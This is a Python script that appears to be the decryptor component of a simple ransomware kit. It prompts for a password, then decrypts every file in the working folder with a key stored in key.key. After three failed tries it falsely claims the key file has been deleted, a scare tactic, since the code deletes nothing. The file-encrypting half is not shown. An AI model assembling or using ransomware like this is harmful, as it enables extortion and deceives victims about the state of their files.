import os, base64, time
from cryptography.fernet import Fernet

def decrypt():
    # Scan files in current folder and add to array
    files = []
    no_decrypt = ["encrypt.py", "decrypt.py", "key.key", "encrypt.exe", "decrypt.exe"]
    for file in os.listdir():
        if file in no_decrypt: continue
        if os.path.isfile(file): files.append(file)

    # read keyfile and decrypt key
    with open("key.key", "rb") as key: secret_key = key.read()
    i = 1
    while i <= 5:
        secret_key = base64.b64decode(secret_key)
        i = i + 1

    # decrypt files
    try:
        for file in files:
            with open(file, "rb")as thefile:
                contents = thefile.read()
                bas_decrypted = base64.b64decode(contents)
                contents_decrypted = Fernet(secret_key).decrypt(bas_decrypted)
            with open(file, "wb") as thefile: thefile.write(contents_decrypted)
    except: print("failed")


# enter password before decryption.
key = "cnhU-NAeF-OsVSUrksfRzzMq_zyZbBlQMI3za0Hv4Ww=".encode("utf-8")
passwd = "gAAAAABimMtjNnSA6K3wvcMVKMIlL1s9-ms1eJwUyfg_vOhhQqTH7vhocyxRuunZ3ThsIPa35Wg5J-od5vvvzh90t8QefnU49w==".encode("utf-8")
passwd_dc = Fernet(key).decrypt(passwd).decode("utf-8")
count = 3
while True:
    user_input = input("Enter the super secret password:\n -> ")
    if user_input == passwd_dc:
        print("Password correct, your files are now decrypted.")
        decrypt()
        time.sleep(1)
        exit()
    else:
        if count <= 1:
            print("the keyfile has been deleted.")
            exit()
        else:
            count = count - 1
            print("try again\n\n")
            print("You have ", count, " chances left...")
